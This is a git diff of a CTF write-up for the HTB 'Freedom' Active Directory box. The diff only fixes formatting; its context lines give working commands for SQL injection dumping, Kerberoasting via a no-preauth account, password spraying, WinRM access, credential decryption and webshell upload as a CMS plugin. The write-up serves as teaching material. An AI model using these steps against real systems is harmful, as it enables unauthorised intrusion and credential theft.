@@ -11,7 +11,7 @@ Overall we ended up **19th** \[*out of 1128 teams worldwide*\], and managed to r
 
 This competition was tons of fun, and I managed to complete all of the FullPwn challenges. This write up concerns the hardest FullPwn box, **Freedom**.
 
-{{< figure src="img-01.png" caption="Challenge Description" >}}
+{{< figure src="images/img-01.png" caption="Challenge Description" >}}
 
 ## Overview
 
@@ -19,7 +19,7 @@ Freedom was a cool FullPwn challenge which consisted of an intricate exploitatio
 
 The below diagram demonstrates a high level overview of the path of I took to solve this challenge:
 
-{{< figure src="img-02.png" caption="My journey to Freedom" >}}
+{{< figure src="images/img-02.png" caption="My journey to Freedom" >}}
 
 There were a few alternative techniques which could be used solve this challenge.
 
@@ -35,11 +35,11 @@ Now, lets dive into it! :)
 
 After deploying the instance and conducting a few nmap scans, we get the following information:
 
-{{< figure src="img-03.png" caption="Nmap Script and Version Scan" >}}
+{{< figure src="images/img-03.png" caption="Nmap Script and Version Scan" >}}
 
 Clearly, we are dealing with a domain controller (DC). However, the following ports indicate additional non-default DC functionality:
 
-- **80/tcp **: A web server which redirects to <http://freedom.htb> and a robots.txt file with interesting endpoints. This suggests that the DC is hosting some web application that may be vulnerable.
+- **80/tcp**: A web server which redirects to <http://freedom.htb> and a robots.txt file with interesting endpoints. This suggests that the DC is hosting some web application that may be vulnerable.
 - **5985/tcp**: Windows Remote Management effectively allows for remote command line access. This is of interest to us as we may utilize this service to access the domain controller should we compromise remote management user accounts.
 
 Additionally, this DC belongs to the domain freedom.htb and the NetBIOS name is DC1 . I also used [netexec](https://www.netexec.wiki/) to confirm this, and glean further information regarding the hosts operating system version:
@@ -48,11 +48,11 @@ Additionally, this DC belongs to the domain freedom.htb and the NetBIOS name is 
 nxc smb 10.129.231.208
 ```
 
-{{< figure src="img-04.png" caption="Netexec Output" >}}
+{{< figure src="images/img-04.png" caption="Netexec Output" >}}
 
 At this point, its a good idea to properly populate our /etc/hosts file. Many Active Directory pentesting tools perform domain resolution, consequently, if we don’t populate the /etc/hosts file properly, such resolutions will fail, and the tools won’t work.
 
-{{< figure src="img-05.png" caption="Populated /etc/hosts File" >}}
+{{< figure src="images/img-05.png" caption="Populated /etc/hosts File" >}}
 
 It is also a good idea to synchronize our attacking machine’s time with the domain controller’s time. Kerberos preauthentication relies on shared knowledge of the current time, therefore attempting Kerberos authentication with differing client/server times will not be successful.
 
@@ -62,21 +62,21 @@ Time synchronization can be performed using:
 sudo ntpdate 10.129.231.208
 ```
 
-{{< figure src="img-06.png" caption="Synchronizing Client/Server Time" >}}
+{{< figure src="images/img-06.png" caption="Synchronizing Client/Server Time" >}}
 
 ### A. Dumping Masa CMS Database
 
 HTTP response headers are often helpful in establishing the technologies powering web applications. It is always worth to examine these in CTFs or engagements:
 
-{{< figure src="img-07.png" caption="Investigating HTTP Response Headers" >}}
+{{< figure src="images/img-07.png" caption="Investigating HTTP Response Headers" >}}
 
 As observed from the figure above, the Generator header returns an interesting value, that of Masa CMS 7.4.5 . Further research into this Content Management System, specifically its version, revealed that it is susceptible to SQL injection.
 
-{{< figure src="img-08.png" caption="Researching exploits for Masa CMS v7.4.5" >}}
+{{< figure src="images/img-08.png" caption="Researching exploits for Masa CMS v7.4.5" >}}
 
 Perhaps someone has done the dirty work already, and created a script or POC we can use?
 
-{{< figure src="img-09.png" caption="Researching GitHub POC for Masa CMS SQL injection CVE" >}}
+{{< figure src="images/img-09.png" caption="Researching GitHub POC for Masa CMS SQL injection CVE" >}}
 
 Indeed there is such a POC. Investigating this POC script revealed that it simply served as a wrapper for Ghauri — an automated SQL injection enumeration and exploitation tool.
 
@@ -86,11 +86,11 @@ Thus, there was no need to use this script directly, as I could just call [Ghaur
 ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid 
 ```
 
-{{< figure src="img-10.png" caption="Automating SQL Injection Exploitation using Ghauri" >}}
+{{< figure src="images/img-10.png" caption="Automating SQL Injection Exploitation using Ghauri" >}}
 
 The above command confirmed this vulnerability, and I could start to enumerate the underlying database. This could be performed once again using Ghauri:
 
-{{< figure src="img-11.png" caption="Ghauri Enumeration Parameters" >}}
+{{< figure src="images/img-11.png" caption="Ghauri Enumeration Parameters" >}}
 
 We can simply append any enumeration option to the end of the original command. For example, dumping the database user can be achieved using:
 
@@ -98,7 +98,7 @@ We can simply append any enumeration option to the end of the original command. 
 ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid --current-user
 ```
 
-{{< figure src="img-12.png" caption="Dumping Database User" >}}
+{{< figure src="images/img-12.png" caption="Dumping Database User" >}}
 
 In such SQL injection scenarios, a typical exploitation path entails recovering password hashes, subjecting them to offline brute force attacks, and then, if any of them crack, logging into the application.
 
@@ -108,17 +108,17 @@ Therefore, identifying the database and table which contained the user records w
 ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid -D dbMasaCMS -T tusers -C FName,LName,UserName,Password --dump
 ```
 
-{{< figure src="img-13.png" caption="tusers Table in dbMasaCMS database — columns Fname,Lname,UserName and Password" >}}
+{{< figure src="images/img-13.png" caption="tusers Table in dbMasaCMS database — columns Fname,Lname,UserName and Password" >}}
 
 These hashes appear to have been hashed with BCrypt. Such hashes are considerably tough to crack, and all attempts at cracking any of the above failed.
 
 However, aside from just the hashes, the names serve as interesting bits of information, as they can be used to enumerate valid domain users.
 
 > **Alternative Solution:** It was possible to leverage this read access to the dbMasaCMS database and achieve admin access on the Masa CMS web interface. This was done by requesting a Password Reset via the admin panel, reading the redirect URL on the database via the SQL injection, and finally visiting this URL to reset the password.
-
+>
 > **See -\> Admin Access to Masa CMS: Abusing Reset Password**
 
-### **B. Enumerating Domain Users**
+### B. Enumerating Domain Users
 
 I opted to use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a wordlist of potential usernames based on the dumped names in the *tusers* database:
 
@@ -145,7 +145,7 @@ Therefore, Kerbrute enumerates users by initiating authentication attempts for e
 kerbrute userenum --dc dc1.freedom.htb -d freedom.htb potential_usernames.txt
 ```
 
-{{< figure src="img-14.png" caption="Enumerating Valid Usernames using Kerbrute" >}}
+{{< figure src="images/img-14.png" caption="Enumerating Valid Usernames using Kerbrute" >}}
 
 As depicted above, two valid user accounts could be enumerated, those of:
 
@@ -166,7 +166,7 @@ Therefore, we can leverage the valid users enumerated in Step B, to assess if *j
 impacket-GetNPUsers freedom.htb/ -dc-ip 10.129.231.208 -usersfile ./domain_users.txt
 ```
 
-{{< figure src="img-15.png" caption="ASREProasting" >}}
+{{< figure src="images/img-15.png" caption="ASREProasting" >}}
 
 Hashcat or john could then be used to attempt to crack this hash.
 
@@ -175,7 +175,7 @@ Unfortunately, this approach **did not work** in the challenge, and *e.tylar’*
 However, a user configured with **NoPreauth** can be leveraged to perform **Kerberoasting** without valid domain credentials. Therefore, the opportunity does not end here.
 
 > This novel technique is outlined here:
-
+>
 > <https://www.semperis.com/blog/new-attack-paths-as-requested-sts/>
 
 But first, lets introduce **Kerberoasting**:
@@ -207,7 +207,7 @@ I came up with a list of SPNs, reinforced through the help of ChatGPT, and then 
 Rubeus.exe kerberoast /nopreauth:e.tylar /domain:freedom.htb /dc:dc1.freedom.htb /nowrap /spns:spnlist.txt
 ```
 
-{{< figure src="img-16.png" caption="Kerberoasting Attack via an Account with Preauth Disabled" >}}
+{{< figure src="images/img-16.png" caption="Kerberoasting Attack via an Account with Preauth Disabled" >}}
 
 > Note: This attack can also be conducted using impacket from a Linux box:
 
@@ -220,12 +220,10 @@ A few hashes were returned, however the first one keenly stood out.
 The first hash, identified by the SPN HTTP/dc1.freedom.htb, was of particular interest because it had been encrypted using RC4. RC4 hashes are substantially faster to crack, compared to AES counterparts.
 
 > Kerberos tickets can be encrypted with one of three methods:
-
-> **- RC4**: Uses the NTLM hash as the RC4 encryption key. Identified by **\$23** in the hash. This method is considered less secure by modern standards.
-
-> **- AES-128**: Uses a 128-bit session key derived from the user’s password. Identified by **\$18**.
-
-> **- AES-256**: Uses a 256-bit session key derived from the user’s password. Identified by **\$19**.
+>
+> - **RC4**: Uses the NTLM hash as the RC4 encryption key. Identified by **\$23** in the hash. This method is considered less secure by modern standards.
+> - **AES-128**: Uses a 128-bit session key derived from the user’s password. Identified by **\$18**.
+> - **AES-256**: Uses a 256-bit session key derived from the user’s password. Identified by **\$19**.
 
 Consequently, I opted to try crack this hash first, and this attempt was successful!
 
@@ -233,7 +231,7 @@ Consequently, I opted to try crack this hash first, and this attempt was success
 hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 ```
 
-{{< figure src="img-17.png" caption="Cracking Kerberoast Hash" >}}
+{{< figure src="images/img-17.png" caption="Cracking Kerberoast Hash" >}}
 
 ### D. Moving Laterally
 
@@ -245,7 +243,7 @@ nxc smb dc1.freedom.htb -u ./domain_users.txt -p 'swordsoffreedom' --continue-on
 
 This password was valid for the *j.bret* user:
 
-{{< figure src="img-18.png" caption="Password Spraying Attack" >}}
+{{< figure src="images/img-18.png" caption="Password Spraying Attack" >}}
 
 With valid user credentials, it is now possible to enumerate the domain further. A useful command for establishing our current users context within the domain is the following:
 
@@ -253,7 +251,7 @@ With valid user credentials, it is now possible to enumerate the domain further.
 nxc ldap dc1.freedom.htb -u 'j.bret' -p 'swordsoffreedom' -M whoami
 ```
 
-{{< figure src="img-19.png" caption="LDAP whoami" >}}
+{{< figure src="images/img-19.png" caption="LDAP whoami" >}}
 
 From the above output, it is evident that *j.bret* is a member of the **Remote Management Users** group, meaning they should have sufficient access to login using Windows Remote Management \[WinRM\] (tcp/5985):
 
@@ -261,7 +259,7 @@ From the above output, it is evident that *j.bret* is a member of the **Remote M
 evil-winrm -i dc1.freedom.htb -u j.bret -p 'swordsoffreedom'
 ```
 
-{{< figure src="img-20.png" caption="Using evil-winrm to log into DC1" >}}
+{{< figure src="images/img-20.png" caption="Using evil-winrm to log into DC1" >}}
 
 As observed from above, this was true, and the user flag was obtained.
 
@@ -269,23 +267,23 @@ As observed from above, this was true, and the user flag was obtained.
 
 Some initial enumeration of the C:\\ drive revealed the presence of Windows Subsystem for Linux (WSL).
 
-{{< figure src="img-21.png" caption="Enumerating WSL Directory in C:" >}}
+{{< figure src="images/img-21.png" caption="Enumerating WSL Directory in C:" >}}
 
 Furthermore, it appears that the WSL installation in play was using Ubuntu as the Operating System. Additionally, WSL version 1 was being utilized. The difference between WSL version 1 and version 2 can be thoroughly assessed [here](https://learn.microsoft.com/en-us/windows/wsl/compare-versions).
 
 In short, WSL version 1 is a compatibility layer. This layer effectively converts Linux syscalls to Windows syscalls, while WSL version 2 utilizes a lightweight virtual machine running a real Linux kernel. Consequently, WSL v1 use the native file system, while WSL v2 leverages a virtual hard disk (VHDX) to store its file system.
 
-{{< figure src="img-22.png" caption="Enumerating C:WSLUbuntu Directory" >}}
+{{< figure src="images/img-22.png" caption="Enumerating C:WSLUbuntu Directory" >}}
 
 The C:\WSL\Ubuntu\rootfs directory listed a typical root Linux filesystem, thereby indicating that we are dealing with WSL 1:
 
-{{< figure src="img-23.png" caption="Enumerating WSL root File System" >}}
+{{< figure src="images/img-23.png" caption="Enumerating WSL root File System" >}}
 
 Investigating the deployment of Masa CMS revealed that it was powered by an underlying [Lucee Server](https://www.lucee.org/). Furthermore, the below Lucee configuration file contained an encrypted data source password which was used to achieve database connections with the MySQL dbMasaCMS database (*the very same one I dumped in* ***A. Dumping Masa CMS Database***):
 
 \WSL\Ubuntu\rootfs\opt\lucee\tomcat\lucee-server\context\\.CFConfig.json
 
-{{< figure src="img-24.png" caption="Encrypted Data Source Password in Lucee Configuration File" >}}
+{{< figure src="images/img-24.png" caption="Encrypted Data Source Password in Lucee Configuration File" >}}
 
 Some [research](https://dev.lucee.org/t/datasource-password-in-application-cfc/10291/11) showed that this password could be recovered using the following utility:
 
@@ -300,7 +298,7 @@ sudo dpkg -i <command_box.dpkg>
 ```
 
 > **CommandBox** is a **command-line tool** and **package manager** specifically designed for CFML (ColdFusion Markup Language) development. It streamlines and automates workflows for ColdFusion/CFML projects and servers, similar to tools like Node.js **npm** or Python’s **pip**, but tailored for CFML environments.
-
+>
 > \- ChatGPT
 
 Following the above, we can install the module, and create a script which would utilize the lucee-password-util.decryptDataSource() method to recover the plaintext data source connection password.
@@ -325,7 +323,7 @@ The script in question was the following, and I saved it under decryptPassword.c
 
 Upon saving the script and visiting its respective endpoint in a browser, the password was displayed:
 
-{{< figure src="img-25.png" caption="Recovered Database Password for Lucee Data Source" >}}
+{{< figure src="images/img-25.png" caption="Recovered Database Password for Lucee Data Source" >}}
 
 ### F. Modifying Masa CMS Admin Password
 
@@ -337,11 +335,11 @@ With this newfound access, we can authenticate to the MySQL database using the r
 proxychains -q mysql -h 127.0.0.1 -u lucee -p
 ```
 
-{{< figure src="img-26.png" caption="Connecting and Authenticating to MySQL" >}}
+{{< figure src="images/img-26.png" caption="Connecting and Authenticating to MySQL" >}}
 
 Finally, we can [generate](https://bcrypt-generator.com/) a known BCrypt hash and update the admin users password:
 
-{{< figure src="img-27.png" caption="Generating BCrypt Hash for ‘hello’" >}}
+{{< figure src="images/img-27.png" caption="Generating BCrypt Hash for ‘hello’" >}}
 
 ```
 UPDATE tusers
@@ -349,7 +347,7 @@ SET password = "$2a$10$KxE3f5yVHpfTF0YAVoI86.qkmghcqo709RU6QYYIThLgkSktnyCDi"
 WHERE Email="admin@freedom.htb";
 ```
 
-{{< figure src="img-28.png" caption="Updating Admins BCrypt Password hash" >}}
+{{< figure src="images/img-28.png" caption="Updating Admins BCrypt Password hash" >}}
 
 It was then possible to login using admin : hello .
 
@@ -357,7 +355,7 @@ It was then possible to login using admin : hello .
 
 Logging into the admin web interface for Masa CMS revealed functionality which allows for the addition of plugins:
 
-{{< figure src="img-29.png" caption="Add Plugin Admin Masa CMS Interface" >}}
+{{< figure src="images/img-29.png" caption="Add Plugin Admin Masa CMS Interface" >}}
 
 Plugins define additional functionality that builds on the features of the CMS. Considering the CMS is powered by CFML, my first thought was to simply zip a cfm webshell, and upload the resultant file. The MasaCMS is running as root on WSL, therefore the webshell must execute commands in a Linux environment.
 
@@ -372,35 +370,35 @@ wget https://raw.githubusercontent.com/reider-roque/pentest-tools/refs/heads/mas
 zip webshell.zip webshell.cfm
 ```
 
-{{< figure src="img-30.png" caption="Zipping CFM Webshell" >}}
+{{< figure src="images/img-30.png" caption="Zipping CFM Webshell" >}}
 
 Next, I uploaded and deployed it on Masa CMS:
 
-{{< figure src="img-31.png" caption="Malicious Plugin Deploy Error" >}}
+{{< figure src="images/img-31.png" caption="Malicious Plugin Deploy Error" >}}
 
 The 500 message describes a *missinginclude* error which has something to do with the uploaded plugins structure. More specifically, the absence of a valid plugin/config.xml.cfm file causes some issues.
 
 > Note: Official MasaCMS Plugin Format:
-
+>
 > <https://docs.murasoftware.com/v6/back-end/plugins/creating-plugins-in-mura-cms/>
 
 With that being said, the webshell still works, and I could access it via:
 
 /plugins/16/webshell.cfm
 
-{{< figure src="img-32.png" caption="Interacting with Web Shell" >}}
+{{< figure src="images/img-32.png" caption="Interacting with Web Shell" >}}
 
 But why does it still work? What about the error?
 
 Well, even though the plugin fails to deploy, as it does not possess the valid prerequisite files/structure, the plugin files successfully get uploaded. We can confirm this through our access to the local file system:
 
-{{< figure src="img-33.png" caption="Investigating Local File System" >}}
+{{< figure src="images/img-33.png" caption="Investigating Local File System" >}}
 
 As such, we can visit its respective URL, and the underlying server will execute it as valid CFML code — thereby achieving code execution when we pass our command parameter.
 
 Finally, it is possible to recover the flag as the C:\\ drive gets mounted on the **/mnt/c** directory.
 
-{{< figure src="img-34.png" caption="Recovering flag" >}}
+{{< figure src="images/img-34.png" caption="Recovering flag" >}}
 
 ## Alternative Solutions
 
@@ -420,17 +418,17 @@ As observed through the figure below, zero entries are returned.
 ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid -D dbMasaCMS -T tredirects --dump --fresh-queries 
 ```
 
-{{< figure src="img-35.png" caption="Dumped tredirects table with zero entries — prior to reset password request" >}}
+{{< figure src="images/img-35.png" caption="Dumped tredirects table with zero entries — prior to reset password request" >}}
 
 2\. Issuing a reset password request for admin:
 
-{{< figure src="img-36.png" caption="Performing a Reset Password Request for the Admin User #1" >}}
+{{< figure src="images/img-36.png" caption="Performing a Reset Password Request for the Admin User #1" >}}
 
-{{< figure src="img-37.png" caption="Performing a Reset Password Request for the Admin User #2" >}}
+{{< figure src="images/img-37.png" caption="Performing a Reset Password Request for the Admin User #2" >}}
 
 3\. Dumping tredirects table after triggering reset password:
 
-{{< figure src="img-38.png" caption="Dumped tredirects table with one entry — after reset password request" >}}
+{{< figure src="images/img-38.png" caption="Dumped tredirects table with one entry — after reset password request" >}}
 
 After successfully performing a password reset attempt, this table has been populated with an entry.
 
@@ -440,7 +438,7 @@ After successfully performing a password reset attempt, this table has been popu
 URL : http://freedom.htb/admin/?muraAction=cEditProfile.edit&siteID=default&returnID=23A93F75-C999-4816-88EC8F17D502E91C&returnUserID=75296552-E0A8-4539-B1A46C806D767072
 ```
 
-{{< figure src="img-39.png" caption="Admin Edit Profile Web Interface" >}}
+{{< figure src="images/img-39.png" caption="Admin Edit Profile Web Interface" >}}
 
 From here, it was possible to perform the same malicious plugin exploitation to recover the root and user flag — I believe this to be an unintended solution.
 
@@ -451,7 +449,7 @@ This is a very cool approach and an attack vector which I missed. There existed 
 This could effectively be abused to achieve a shell as SYSTEM.
 
 > I do not cover the steps here, however int3x made a nice write-up regarding this exploitation procedure:
-
+>
 > <https://github.com/int3x/ctf-writeups/blob/main/HTB%20Uni-CTF%202024/Freedom/README.md>
 
 Considering the nature of the root flag -\> HTB{l34ky_h4ndl3rs_4th3_w1n}, this is almost certainly the intended privilege escalation step.
